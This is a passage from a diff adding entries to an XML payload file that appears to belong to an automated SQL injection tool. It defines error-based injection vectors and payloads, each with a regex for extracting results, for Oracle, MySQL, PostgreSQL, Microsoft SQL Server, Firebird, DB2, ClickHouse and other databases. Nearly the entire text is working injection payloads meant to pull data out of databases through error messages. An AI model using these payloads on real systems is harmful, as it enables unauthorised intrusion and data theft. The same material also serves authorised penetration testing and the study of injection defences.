+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND error-based - WHERE or HAVING clause (XMLType)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE or HAVING clause (XMLType)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+            <dbms_version>&gt;= 8.1.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+            <dbms_version>&gt;= 8.1.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MonetDB AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MonetDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MonetDB OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MonetDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <!--
+         TODO: if possible, add payload for SQLite, Microsoft Access,
+         and SAP MaxDB - no known techniques at this time
+    -->
+    <!-- End of error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
+
+    <!-- Error-based tests - LIMIT clause -->
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+    <!-- End of error-based tests - LIMIT clause -->
+
+    <!-- Error-based tests - Parameter replace -->
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            -->
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (EXP)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <request>
+            <payload>EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <request>
+            <payload>JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.7.8</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            -->
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
+            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
+            -->
+            <payload>(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
+            <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))</payload>
+            -->
+            <payload>(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <request>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL error-based - Parameter replace (GENERATE_SERIES)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <request>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
+        <request>
+            <payload>(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <request>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>4</level>
